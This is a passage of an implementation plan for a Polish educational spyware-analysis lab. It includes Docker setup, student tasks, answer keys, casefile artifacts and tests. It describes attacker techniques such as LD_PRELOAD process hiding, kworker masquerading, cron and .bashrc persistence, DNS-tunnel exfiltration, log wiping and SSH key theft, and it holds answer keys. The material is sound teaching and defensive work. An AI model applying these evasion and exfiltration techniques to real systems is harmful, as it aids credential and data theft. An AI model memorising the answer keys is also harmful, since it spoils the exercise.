        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S_%f")
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        (DATA_DIR / f"{ts}.txt").write_text(qname + "\n")

        reply = request.reply()
        if qname.endswith(DOMAIN):
            reply.add_answer(RR(request.q.qname, QTYPE.A,
                               rdata=A(ANSWER_IP), ttl=1))
        return reply


if __name__ == "__main__":
    resolver = LoggingResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    print(f"DNS server listening on :53 for *.{DOMAIN}")
    server.start()
```

- [ ] **Step 2: Write dns-server/Dockerfile**

```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir dnslib==0.9.25
RUN mkdir -p /data/dns-queries
COPY module-techlab/dns-server/server.py /app/server.py
EXPOSE 53/udp 53/tcp
CMD ["python", "/app/server.py"]
```

- [ ] **Step 3: Write docker-compose.yml**

```yaml
# module-techlab/docker-compose.yml
services:

  victim:
    build:
      context: ../
      dockerfile: module-techlab/victim/Dockerfile
      args:
        ROUND: "${ROUND:-1}"
    profiles: ["full"]
    hostname: workstation-042
    networks:
      ghost-net:
        ipv4_address: 10.13.37.2
    environment:
      ROUND: "${ROUND:-1}"
    depends_on:
      c2-server:
        condition: service_healthy

  c2-server:
    build:
      context: c2-server
    profiles: ["full"]
    networks:
      ghost-net:
        ipv4_address: 10.13.37.1
    volumes:
      - c2-data:/data/received
      - ./c2-server/certs:/certs:ro
    environment:
      PORT: "8080"
    healthcheck:
      test: ["CMD", "curl", "-sf", "http://localhost:8080/health"]
      interval: 5s
      timeout: 3s
      retries: 15

  analyst-ws:
    build:
      context: ../
      dockerfile: module-techlab/analyst-ws/Dockerfile
    profiles: ["full"]
    networks:
      - ghost-net
    ports:
      - "${ANALYST_WS_PORT:-8888}:8888"
    environment:
      JUPYTER_TOKEN: "${JUPYTER_TOKEN:-ghost}"
    volumes:
      - ./analyst-ws/notebooks:/home/analityk/notebooks
      - ../module-casefile:/home/analityk/casefile:ro
      - c2-data:/data/received:ro

  dns-server:
    build:
      context: ../
      dockerfile: module-techlab/dns-server/Dockerfile
    profiles: ["round3"]
    networks:
      ghost-net:
        ipv4_address: 10.13.37.53
    volumes:
      - dns-data:/data/dns-queries

networks:
  ghost-net:
    driver: bridge
    internal: true
    ipam:
      config:
        - subnet: 10.13.37.0/24

volumes:
  c2-data:
  dns-data:
```

- [ ] **Step 4: Commit**

```bash
git add module-techlab/dns-server/ module-techlab/docker-compose.yml
git commit -m "feat: add dns-server and docker-compose — all services wired"
```

---

## Phase 4 — Lab Content

### Task 11: Round 1 tasks and casefile

**Files:**
- Create: `module-techlab/rounds/round-1-naive/zadania.md`
- Create: `module-techlab/rounds/round-1-naive/answer-key.md`
- Create: `module-casefile/round-1/zadania.md`
- Create: `module-casefile/round-1/process-list.txt`
- Create: `module-casefile/round-1/stolen-data-sample.json`

- [ ] **Step 1: Write round-1-naive/zadania.md**

```markdown
# Zadania — Runda 1: Naïve Spyware

```bash
ROUND=1 docker compose --profile full up -d --build
docker compose exec analyst-ws bash
```

## Faza Red Team — Analiza próbki

### Zadanie 1.1 — Identyfikacja procesu

```bash
docker compose exec victim ps aux
```

Znajdź podejrzany proces. Zapisz jego PID, nazwę i ścieżkę do pliku wykonywalnego.

### Zadanie 1.2 — Śledzenie wywołań systemowych

```bash
docker compose exec analyst-ws bash
# W kontenerze analyst-ws połącz się z victim:
# (PID uzyskany z zadania 1.1)
docker compose exec victim strace -p <PID> -e trace=open,read,write,connect 2>&1 | head -50
```

Co czyta spyware? Gdzie zapisuje dane?

### Zadanie 1.3 — Przechwycenie ruchu HTTP

```bash
docker compose exec analyst-ws tcpdump -i eth0 -A 'tcp port 8080' -c 20
```

Odczytaj eksfiltrowane dane w plaintext. Jakie pliki zostały skradzione?

### Zadanie 1.4 — Mapowanie próbki

Na podstawie obserwacji uzupełnij tabelę:

| Element        | Wartość |
|----------------|---------|
| Nazwa procesu  |         |
| Ścieżka        |         |
| IP serwera C2  |         |
| Port C2        |         |
| Protokół       |         |
| Dane zbierane  |         |
| Interwał (s)   |         |

## Faza Blue Team — Odpowiedź

### Zadanie 1.5 — Dokumentacja IOC

Zapisz w pliku `/home/analityk/notebooks/ioc-round-1.md`:
- Hash MD5 pliku spyware
- IP i port C2
- Wzorzec ruchu (co i kiedy wysyła)

### Zadanie 1.6 — Usunięcie spyware

```bash
docker compose exec victim bash -c "kill <PID>"
# Zweryfikuj że ruch ustał:
docker compose exec analyst-ws tcpdump -i eth0 'tcp port 8080' -c 5
```

### Zadanie 1.7 — Raport

Napisz jednostronicowy raport incydentu w `/home/analityk/notebooks/raport-runda-1.md`.
Uwzględnij: co się stało, kiedy wykryto, co skradziono, jak usunięto.
```

- [ ] **Step 2: Write round-1-naive/answer-key.md**

```markdown
# Klucz odpowiedzi — Runda 1

## 1.1
Proces: `python3 spyware.py`  
Ścieżka: `/opt/spyware/spyware.py`

## 1.2
strace pokaże: `open("/tmp/.klog", ...)`, `open("/home/analyst/.bash_history", ...)`,
`connect(sockfd, {AF_INET, 10.13.37.1, 8080})`

## 1.3
Payload JSON zawiera pola: `ts`, `hostname`, `keylog`, `files`, `screenshot`.
Pliki: `.bash_history`, `.ssh/id_rsa`, `Documents/report-draft.txt`

## 1.4
| Element       | Wartość                     |
|---------------|-----------------------------|
| Nazwa procesu | python3 spyware.py          |
| Ścieżka       | /opt/spyware/spyware.py     |
| IP C2         | 10.13.37.1                  |
| Port C2       | 8080                        |
| Protokół      | HTTP POST                   |
| Dane          | keylog, pliki, screenshot   |
| Interwał      | 60s                         |
```

- [ ] **Step 3: Write module-casefile/round-1/process-list.txt**

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
analyst      1  0.0  0.0   4624  3456 ?        Ss   08:00   0:00 /bin/bash /entrypoint.sh
analyst     12  0.3  1.2  45312 24576 ?        S    08:00   0:02 python3 spyware.py
analyst     34  0.0  0.1  15232  2048 ?        S    08:00   0:00 Xvfb :99 -screen 0 1024x768x24
analyst     41  0.0  0.0   4508  1024 ?        S    08:00   0:00 /bin/bash /simulate-user.sh
```

- [ ] **Step 4: Write module-casefile/round-1/stolen-data-sample.json**

```json
{
  "ts": "2026-04-14T08:01:02.123456+00:00",
  "hostname": "workstation-042",
  "round": 1,
  "keylog": "ls -la ~/Documents\ncat ~/.ssh/id_rsa\n",
  "files": {
    ".bash_history": "historia_powloki_analityk\nls -la ~/Documents\n",
    ".ssh/id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...EDUKACJA\n-----END RSA PRIVATE KEY-----\n",
    "Documents/report-draft.txt": "Szkic raportu — POUFNE\nDane klientów: Jan Kowalski, ul. Lipowa 15\n"
  },
  "screenshot": true
}
```

- [ ] **Step 5: Write module-casefile/round-1/zadania.md** (classroom version, no Docker)

```markdown
# Zadania — Runda 1 (Casefile — bez Docker)

Przeanalizuj artefakty w tym katalogu bez uruchamiania środowiska Docker.

## Zadanie 1.1 — Analiza listy procesów

Otwórz `process-list.txt`. Który proces jest podejrzany i dlaczego?

## Zadanie 1.2 — Analiza eksfiltrowanych danych

Otwórz `stolen-data-sample.json`.
- Jakie pliki zostały skradzione?
- Jakie dane z klawiatury przechwycono?
- Skąd wiadomo, że to spyware a nie legalna aplikacja?

## Zadanie 1.3 — IOC

Na podstawie pliku JSON zidentyfikuj wszystkie wskaźniki kompromitacji (IOC).
```

- [ ] **Step 6: Commit**

```bash
git add module-techlab/rounds/round-1-naive/ module-casefile/round-1/
git commit -m "feat: add Round 1 tasks and casefile artifacts"
```

---

### Task 12: Round 2 tasks and casefile

**Files:**
- Create: `module-techlab/rounds/round-2-hidden/zadania.md`
- Create: `module-techlab/rounds/round-2-hidden/answer-key.md`
- Create: `module-casefile/round-2/zadania.md`
- Create: `module-casefile/round-2/crontab-dump.txt`

- [ ] **Step 1: Write round-2-hidden/zadania.md**

```markdown
# Zadania — Runda 2: Hidden Spyware

```bash
ROUND=2 docker compose --profile full up -d --build
docker compose exec analyst-ws bash
```

## Faza Red Team

### Zadanie 2.1 — Znajdź anomalię w procesach

```bash
docker compose exec victim ss -tp
docker compose exec victim lsof -i TCP
```

Dlaczego proces o nazwie `[kworker/u4:2]` ma otwarty socket TCP?
Prawdziwe wątki jądra nie nawiązują połączeń TCP.

### Zadanie 2.2 — Zidentyfikuj prawdziwy plik wykonywalny

```bash
docker compose exec victim ls -la /proc/<PID>/exe
docker compose exec victim cat /proc/<PID>/cmdline | tr '\0' ' '
```

### Zadanie 2.3 — Odszyfruj ruch HTTPS

```bash
# Cert C2 jest dostępny w casefile jako artefakt nakazu sądowego:
cp /home/analityk/casefile/round-2/c2-certificate.pem /tmp/c2.pem

docker compose exec analyst-ws tcpdump -i eth0 -w /tmp/capture.pcap 'tcp port 443' &
sleep 90
# Odczytaj z certyfikatem:
docker compose exec analyst-ws tshark -r /tmp/capture.pcap \
  -o "tls.keys_list:10.13.37.1,443,http,/tmp/c2.pem"
```

### Zadanie 2.4 — Znajdź mechanizm persistence

```bash
docker compose exec victim crontab -l
docker compose exec victim ls -la /etc/cron*
```

## Faza Blue Team

### Zadanie 2.5 — Usuń persistence

```bash
docker compose exec victim crontab -r
docker compose exec victim crontab -l  # powinno być puste
```

### Zadanie 2.6 — Skrypt detekcji

Napisz `/home/analityk/notebooks/detect-r2.sh`:
```bash
#!/bin/bash
# Wykrywa procesy nieSystemowe nasłuchujące na porcie 443
ss -tp | awk '{print $4, $6}' | grep ':443' | while read addr proc; do
  pid=$(echo "$proc" | grep -oP 'pid=\K[0-9]+')
  exe=$(readlink /proc/$pid/exe 2>/dev/null)
  if [[ "$exe" != /usr/bin/* ]] && [[ "$exe" != /bin/* ]]; then
    echo "ALERT: podejrzany proces $pid ($exe) na porcie 443"
  fi
done
```

### Zadanie 2.7 — Porównanie z Rundą 1

Wypełnij tabelę w `/home/analityk/notebooks/raport-runda-2.md`:

| Technika OPSEC    | Runda 1 | Runda 2 |
|-------------------|---------|---------|
| Nazwa procesu     |         |         |
| Szyfrowanie       |         |         |
| Persistence       |         |         |
| Widoczność w `ps` |         |         |
```

- [ ] **Step 2: Write round-2-hidden/answer-key.md**

```markdown
# Klucz odpowiedzi — Runda 2

## 2.1
`ss -tp` pokaże: `[kworker/u4:2]` z połączeniem do 10.13.37.1:443.
Wątki jądra (`kworker`) nigdy nie otwierają socketów TCP z przestrzeni użytkownika.

## 2.2
`/proc/<PID>/exe` → `/opt/spyware/spyware.py` (lub `python3`)
`cmdline` → `python3 /opt/spyware/spyware.py`

## 2.3
Po podaniu certyfikatu tshark odszyfruje ruch i pokaże JSON z beaconem.

## 2.4
`crontab -l` pokaże: `@reboot python3 /opt/spyware/spyware.py`

## 2.7 Porównanie
| Technika        | Runda 1          | Runda 2             |
|-----------------|------------------|---------------------|
| Nazwa procesu   | python3 spyware.py | [kworker/u4:2]    |
| Szyfrowanie     | brak (HTTP)      | HTTPS (TLS)         |
| Persistence     | brak             | crontab @reboot     |
| Widoczność w ps | tak              | tak (ale z alias)   |
```

- [ ] **Step 3: Write module-casefile/round-2/crontab-dump.txt**

```
# Crontab użytkownika analyst — 2026-04-14 09:15:00 UTC
# (uzyskany na podstawie nakazu sądowego)
@reboot python3 /opt/spyware/spyware.py
```

- [ ] **Step 4: Write module-casefile/round-2/zadania.md**

```markdown
# Zadania — Runda 2 (Casefile — bez Docker)

## Zadanie 2.1 — Crontab

Otwórz `crontab-dump.txt`. Co uruchamia się przy każdym starcie systemu?
Dlaczego `@reboot` jest efektywnym mechanizmem persistence?

## Zadanie 2.2 — Certyfikat C2

Otwórz `c2-certificate.pem` narzędziem:
```bash
openssl x509 -in c2-certificate.pem -text -noout
```
Jaką domenę podszywało się C2? Co to mówi o taktyce atakującego?

## Zadanie 2.3 — Porównanie z Rundą 1

Na podstawie obu casefilów: co zmieniło się w OPSEC między rundami?
```

- [ ] **Step 5: Commit**

```bash
git add module-techlab/rounds/round-2-hidden/ module-casefile/round-2/
git commit -m "feat: add Round 2 tasks and casefile artifacts"
```

---

### Task 13: Round 3 tasks and casefile

**Files:**
- Create: `module-techlab/rounds/round-3-advanced/zadania.md`
- Create: `module-techlab/rounds/round-3-advanced/answer-key.md`
- Create: `module-casefile/round-3/zadania.md`
- Create: `module-casefile/round-3/auditd-log.txt`
- Create: `module-casefile/round-3/syslog-tampered.txt`
- Create: `module-casefile/round-3/syslog-original.txt`

- [ ] **Step 1: Write round-3-advanced/zadania.md**

```markdown
# Zadania — Runda 3: Advanced Spyware

```bash
ROUND=3 docker compose --profile full --profile round3 up -d --build
docker compose exec analyst-ws bash
```

## Faza Red Team

### Zadanie 3.1 — Spyware nie widać w `ps`

```bash
docker compose exec victim ps aux
# Nie widać podejrzanego procesu — ale ruch DNS jest aktywny.

# Przeszukaj /proc ręcznie z poziomu analyst-ws:
docker compose exec analyst-ws bash -c \
  "for pid in /proc/[0-9]*; do
     exe=\$(readlink \$pid/exe 2>/dev/null)
     echo \"\$pid: \$exe\"
   done" | grep python
```

Wyjaśnij mechanizm ukrywania. Skąd pochodzi rozbieżność między `ps` a `/proc`?

### Zadanie 3.2 — Anomalie w ruchu DNS

```bash
docker compose exec analyst-ws tcpdump -i eth0 -w /tmp/dns.pcap 'udp port 53' &
sleep 120
# Przeanalizuj:
docker compose exec analyst-ws tshark -r /tmp/dns.pcap -T fields -e dns.qry.name \
  | grep ghost-pkg | head -20
```

Jaki wzorzec mają subdomeny? Co jest w nich zakodowane?

### Zadanie 3.3 — Dekodowanie eksfiltracji

```bash
docker compose exec analyst-ws python3 /home/analityk/tools/dns-decoder.py \
  /tmp/dns.pcap --domain update.ghost-pkg.net
```

Co zostało skradzione?

### Zadanie 3.4 — Oś czasu ataku

```bash
docker compose exec analyst-ws python3 /home/analityk/tools/timeline-builder.py \
  /data/received/
```

## Faza Blue Team

### Zadanie 3.5 — Wykrycie manipulacji logami

```bash
# Porównaj syslog z logami auditd:
docker compose exec victim cat /var/log/syslog | grep -i python
docker compose exec victim ausearch -x python3 --raw | head -20
```

Dlaczego syslog jest pusty, ale auditd ma wpisy? Co to implikuje dla strategii logowania?

### Zadanie 3.6 — Persistence w .bashrc

```bash
docker compose exec victim grep -n "spyware\|update hook" ~/.bashrc
```

### Zadanie 3.7 — Hardening

W raporcie końcowym zaproponuj:
1. Regułę firewall blokującą wychodzące zapytania DNS do obcych serwerów
2. Politykę `auditd` wykrywającą wykonanie Pythona spoza `/usr/bin`
3. Immutable logi: `chattr +a /var/log/syslog`

### Zadanie 3.8 — Raport końcowy

Napisz pełny raport incydentu w `/home/analityk/notebooks/raport-final.md` obejmujący wszystkie 3 rundy.
```

- [ ] **Step 2: Write round-3-advanced/answer-key.md**

```markdown
# Klucz odpowiedzi — Runda 3

## 3.1
Spyware ustawia `HIDE_PID` i ładuje `libhide.so` jako `LD_PRELOAD`.
`libhide.so` hookuje `readdir()` — gdy `ps` czyta `/proc`, wpis z PID spyware jest filtrowany.
Przeszukanie `/proc` z zewnętrznego kontenera (analyst-ws) omija hook i ujawnia PID.

## 3.2
Subdomeny mają format: `<hex_data>.<index>.<session_ts>.update.ghost-pkg.net`
Dane są zakodowane jako hex, podzielone na 32-znakowe fragmenty.

## 3.3
`dns-decoder.py` agreguje fragmenty według session_ts i indeksu, dekoduje hex → UTF-8.
Wynik: zawartość `.bash_history`, `.ssh/id_rsa`, `Documents/report-draft.txt` + keylog.

## 3.5
`auditd` działa jako oddzielny serwis kernel-level — spyware nie może go modyfikować
bez uprawnień root. Syslog działa w userspace i jest podatny na wyczyszczenie przez
zwykłego użytkownika z dostępem do pliku.

## 3.7 Przykładowe rozwiązania
```bash
# Firewall DNS (iptables):
iptables -A OUTPUT -p udp --dport 53 ! -d 10.13.37.53 -j DROP

# auditd policy (/etc/audit/rules.d/python.rules):
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/python3 -F key=python_exec
-a always,exit -F arch=b64 -S execve -F exe!=/usr/bin/python3 -F comm=python3 -F key=python_suspicious

# Immutable log:
chattr +a /var/log/syslog /var/log/auth.log
```
```

- [ ] **Step 3: Write casefile artifacts**

`module-casefile/round-3/auditd-log.txt`:
```
type=EXECVE msg=audit(1744617600.000:1001): argc=2 a0="python3" a1="/opt/spyware/spyware.py"
type=EXECVE msg=audit(1744617660.000:1002): argc=2 a0="python3" a1="/opt/spyware/spyware.py"
type=SYSCALL msg=audit(1744617600.000:1001): arch=c000003e syscall=59 success=yes pid=1337 exe="/usr/bin/python3"
```

`module-casefile/round-3/syslog-tampered.txt`:
```
Apr 14 08:00:01 workstation-042 CRON[42]: (analyst) CMD (echo hello)
Apr 14 08:15:00 workstation-042 kernel: eth0: renamed from veth3a2b1c
```

`module-casefile/round-3/syslog-original.txt`:
```
Apr 14 08:00:01 workstation-042 CRON[42]: (analyst) CMD (echo hello)
Apr 14 08:00:05 workstation-042 python3[1337]: spyware started
Apr 14 08:01:02 workstation-042 python3[1337]: beacon sent
Apr 14 08:15:00 workstation-042 kernel: eth0: renamed from veth3a2b1c
```

`module-casefile/round-3/zadania.md`:
```markdown
# Zadania — Runda 3 (Casefile — bez Docker)

## Zadanie 3.1 — Analiza logów

Porównaj `syslog-tampered.txt` z `syslog-original.txt`.
Jakich wpisów brakuje? Co to mówi o działaniu spyware?

## Zadanie 3.2 — auditd vs syslog

Otwórz `auditd-log.txt`. Dlaczego auditd zawiera wpisy, których nie ma w syslog?

## Zadanie 3.3 — Ochrona logów

Zaproponuj co najmniej dwa mechanizmy, które uniemożliwiłyby usunięcie wpisów z syslog.
```

- [ ] **Step 4: Commit**

```bash
git add module-techlab/rounds/round-3-advanced/ module-casefile/round-3/
git commit -m "feat: add Round 3 tasks and casefile artifacts"
```

---

## Phase 5 — Tests

### Task 14: Unit tests (casefile structure + spyware headers)

**Files:**
- Create: `tests/test_casefile_structure.py`

- [ ] **Step 1: Write test**

```python
# tests/test_casefile_structure.py
from pathlib import Path

CASEFILE = Path("module-casefile")

EXPECTED = {
    "round-1": [
        "process-list.txt",
        "stolen-data-sample.json",
        "zadania.md",
    ],
    "round-2": [
        "c2-certificate.pem",
        "crontab-dump.txt",
        "zadania.md",
    ],
    "round-3": [
        "auditd-log.txt",
        "syslog-tampered.txt",
        "syslog-original.txt",
        "zadania.md",
    ],
}


def test_all_casefile_files_exist():
    missing = []
    for folder, files in EXPECTED.items():
        for f in files:
            p = CASEFILE / folder / f
            if not p.exists():
                missing.append(str(p))
    assert not missing, f"Missing casefile files:\n" + "\n".join(missing)


def test_all_spyware_headers_present():
    samples = Path("core/spyware-samples")
    for src in samples.rglob("*.py"):
        text = src.read_text()
        assert "GHOST-IN-THE-BOX LAB" in text, f"{src} missing lab header"
        assert "EDUCATIONAL SAMPLE" in text, f"{src} missing educational header"
```

- [ ] **Step 2: Run — expect PASS**

```bash
pytest tests/test_casefile_structure.py -v
# Expected: 2 passed
```

- [ ] **Step 3: Run full test suite**

```bash
pytest tests/ -v --ignore=tests/test_techlab_integration.py
# Expected: all passed (no Docker required)
```

- [ ] **Step 4: Commit**

```bash
git add tests/test_casefile_structure.py
git commit -m "test: add casefile structure and spyware header tests"
```

---

### Task 15: Integration tests (Docker stacks)

**Files:**
- Create: `tests/test_techlab_integration.py`

- [ ] **Step 1: Write integration tests**

```python
# tests/test_techlab_integration.py
"""
Docker integration tests — skipped if Docker is unavailable.
Run: pytest tests/test_techlab_integration.py -v -s
"""
import subprocess
import time
import os
from pathlib import Path

import pytest

TECHLAB = Path(__file__).parent.parent / "module-techlab"


def _docker_available() -> bool:
    try:
        r = subprocess.run(["docker", "version", "--format", "{{.Server.Version}}"],
                           capture_output=True, text=True, timeout=5)
        return r.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def _env(round_num: str) -> dict:
    base = {k: v for k, v in os.environ.items() if k in ("HOME", "USER", "PATH", "LANG")}
    return {"ROUND": round_num, **base}


def _wait_healthy(env: dict, retries: int = 30) -> bool:
    for _ in range(retries):
        r = subprocess.run(
            ["docker", "compose", "exec", "-T", "c2-server",
             "curl", "-sf", "http://localhost:8080/health"],
            cwd=TECHLAB, env=env, capture_output=True, text=True, timeout=10,
        )
        if r.returncode == 0:
            return True
        time.sleep(3)
    return False


# ---------------------------------------------------------------------------
# Round 1
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def stack_r1():
    if not _docker_available():
        pytest.skip("Docker not available")
    env = _env("1")
    subprocess.run(
        ["docker", "compose", "--profile", "full", "up", "-d", "--build"],
        cwd=TECHLAB, env=env, check=True, timeout=600,
    )
    if not _wait_healthy(env):
        subprocess.run(["docker", "compose", "--profile", "full", "down", "-v"],
                       cwd=TECHLAB, env=env, timeout=120)
        pytest.fail("c2-server did not become healthy (ROUND=1)")
    time.sleep(5)
    yield env
    subprocess.run(["docker", "compose", "--profile", "full", "down", "-v"],
                   cwd=TECHLAB, env=env, timeout=120)


def test_r1_c2_receives_beacon_within_90s(stack_r1):
    """Victim must send at least one beacon within 90 seconds of startup."""
    env = stack_r1
    deadline = time.time() + 90
    while time.time() < deadline:
        r = subprocess.run(
            ["docker", "compose", "exec", "-T", "c2-server",
             "sh", "-c", "ls /data/received/*.json 2>/dev/null | wc -l"],
            cwd=TECHLAB, env=env, capture_output=True, text=True, timeout=10,
        )
        if r.returncode == 0 and int(r.stdout.strip()) >= 1:
            return
        time.sleep(5)
    pytest.fail("No beacon received within 90 seconds (ROUND=1)")


def test_r1_spyware_process_visible_in_ps(stack_r1):
    env = stack_r1
    r = subprocess.run(
        ["docker", "compose", "exec", "-T", "victim", "ps", "aux"],
        cwd=TECHLAB, env=env, capture_output=True, text=True, timeout=15,
    )
    assert "spyware.py" in r.stdout, "Round 1 spyware must be visible in ps"


# ---------------------------------------------------------------------------
# Round 2
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def stack_r2():
    if not _docker_available():
        pytest.skip("Docker not available")
    env = _env("2")
    subprocess.run(
        ["docker", "compose", "--profile", "full", "up", "-d", "--build"],
        cwd=TECHLAB, env=env, check=True, timeout=600,
    )
    if not _wait_healthy(env):
        subprocess.run(["docker", "compose", "--profile", "full", "down", "-v"],
                       cwd=TECHLAB, env=env, timeout=120)
        pytest.fail("c2-server did not become healthy (ROUND=2)")
    time.sleep(5)
    yield env
    subprocess.run(["docker", "compose", "--profile", "full", "down", "-v"],
                   cwd=TECHLAB, env=env, timeout=120)


def test_r2_process_name_is_disguised(stack_r2):
    env = stack_r2
    r = subprocess.run(
        ["docker", "compose", "exec", "-T", "victim", "ps", "aux"],
        cwd=TECHLAB, env=env, capture_output=True, text=True, timeout=15,
    )
    assert "spyware.py" not in r.stdout, "Round 2 spyware must NOT appear as spyware.py"
    assert "kworker" in r.stdout, "Round 2 process must masquerade as kworker"


def test_r2_c2_listens_on_https(stack_r2):
    env = stack_r2
    r = subprocess.run(
        ["docker", "compose", "exec", "-T", "analyst-ws",
         "curl", "-sk", "https://10.13.37.1/health"],
        cwd=TECHLAB, env=env, capture_output=True, text=True, timeout=15,
    )
    assert r.returncode == 0, "c2-server must respond on HTTPS for Round 2"


# ---------------------------------------------------------------------------
# Round 3
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def stack_r3():
    if not _docker_available():
        pytest.skip("Docker not available")
    env = _env("3")
    subprocess.run(
        ["docker", "compose", "--profile", "full", "--profile", "round3",
         "up", "-d", "--build"],
        cwd=TECHLAB, env=env, check=True, timeout=600,
    )
    if not _wait_healthy(env):
        subprocess.run(
            ["docker", "compose", "--profile", "full", "--profile", "round3",
             "down", "-v"],
            cwd=TECHLAB, env=env, timeout=120)
        pytest.fail("c2-server did not become healthy (ROUND=3)")
    time.sleep(5)
    yield env
    subprocess.run(
        ["docker", "compose", "--profile", "full", "--profile", "round3",
         "down", "-v"],
        cwd=TECHLAB, env=env, timeout=120)


def test_r3_spyware_hidden_from_ps(stack_r3):
    env = stack_r3
    r = subprocess.run(
        ["docker", "compose", "exec", "-T", "victim", "ps", "aux"],
        cwd=TECHLAB, env=env, capture_output=True, text=True, timeout=15,
    )
    assert "spyware.py" not in r.stdout, "Round 3 spyware must be hidden from ps"


def test_r3_dns_queries_to_tunneling_domain(stack_r3):
    """After 120s, dns-server must have received queries for the tunneling domain."""
    env = stack_r3
    time.sleep(120)
    r = subprocess.run(
        ["docker", "compose", "exec", "-T", "dns-server",
         "sh", "-c", "ls /data/dns-queries/*.txt 2>/dev/null | wc -l"],
        cwd=TECHLAB, env=env, capture_output=True, text=True, timeout=15,
    )
    count = int(r.stdout.strip()) if r.returncode == 0 else 0
    assert count >= 1, "dns-server must have received at least one tunneling query"
```

- [ ] **Step 2: Run unit tests only (sanity check)**

```bash
pytest tests/ --ignore=tests/test_techlab_integration.py -v
# Expected: all passed
```

- [ ] **Step 3: Commit**

```bash
git add tests/test_techlab_integration.py
git commit -m "test: add Docker integration tests for all 3 rounds"
```

---

## Phase 6 — Scenario Narrative

### Task 16: Scenario documents (Polish)

**Files:**
- Create: `core/scenario/briefing.md`
- Create: `core/scenario/attacker-profile.md`

- [ ] **Step 1: Write core/scenario/briefing.md**

```markdown
# Ghost-in-the-Box Lab — Briefing

**Klasyfikacja:** ĆWICZENIE AKADEMICKIE — NIEKLASYFIKOWANE

## Sytuacja

Dział bezpieczeństwa otrzymał zgłoszenie od pracownika firmy **TechCorp Sp. z o.o.**,
że jego stacja robocza zachowuje się podejrzanie: wolno działa, a połączenia sieciowe
są aktywne nawet przy braku użytkowania.

Analiza wstępna wskazuje na obecność oprogramowania szpiegującego.
Zostałeś/aś wyznaczony/a do przeprowadzenia analizy incydentu.

## Środowisko

Stacja robocza ofiary: `workstation-042` (Ubuntu 24.04)  
Użytkownik: `analyst`  
Twoja stacja: `analyst-ws` (połączona przez sieć `ghost-net`)

## Cel

1. Zidentyfikuj oprogramowanie szpiegujące (red team)
2. Udokumentuj IOC i metodę działania
3. Usuń spyware i zabezpiecz system (blue team)
4. Napisz raport incydentu

## Rundy

Środowisko jest dostępne w 3 wariantach trudności — każdy uruchamiasz osobno:

| Runda | Polecenie                                          | OPSEC atakującego     |
|-------|----------------------------------------------------|-----------------------|
| 1     | `ROUND=1 docker compose --profile full up -d`      | brak                  |
| 2     | `ROUND=2 docker compose --profile full up -d`      | ukryty proces, HTTPS  |
| 3     | `ROUND=3 docker compose --profile full --profile round3 up -d` | zaawansowany |
```

- [ ] **Step 2: Write core/scenario/attacker-profile.md**

```markdown
# Profil atakującego — "ghost"

**Alias:** ghost  
**Cel:** kradzież danych uwierzytelniających i dokumentów poufnych z stacji roboczych  
**Motywacja:** szpiegostwo przemysłowe / odsprzedaż danych

## Ewolucja OPSEC

**Runda 1 — brak ukrywania**  
Spyware uruchomiony wprost jako `python3 spyware.py`. Dane wysyłane HTTP plaintext.
Każdy analityk z dostępem do `ps` i `tcpdump` go znajdzie.

**Runda 2 — podstawowe ukrywanie**  
Proces udaje wątek jądra (`[kworker/u4:2]`). Ruch zaszyfrowany (HTTPS).
Dodano persistence przez crontab. Nadal wykrywalny przez analizę `/proc`.

**Runda 3 — zaawansowany**  
Proces ukryty przed `/proc` przez hook `LD_PRELOAD`. Eksfiltracja przez DNS tunneling —
brak bezpośredniego połączenia TCP z C2. Logi czyszczone po każdej sesji.
Persistence przez `.bashrc`.
```

- [ ] **Step 3: Commit**

```bash
git add core/scenario/
git commit -m "feat: add Polish scenario narrative — briefing and attacker profile"
```

---

## Final Checks

- [ ] **Run full test suite**

```bash
pytest tests/ --ignore=tests/test_techlab_integration.py -v
# Expected: all passed
```

- [ ] **Verify directory structure**

```bash
find . -type f | grep -v ".git" | sort
```

- [ ] **Smoke-test Round 1 manually** (requires Docker)

```bash
cd module-techlab
ROUND=1 docker compose --profile full up -d --build
# Wait 90s, then:
docker compose exec c2-server sh -c "ls /data/received/"
# Should show .json beacon files
docker compose --profile full down -v
```
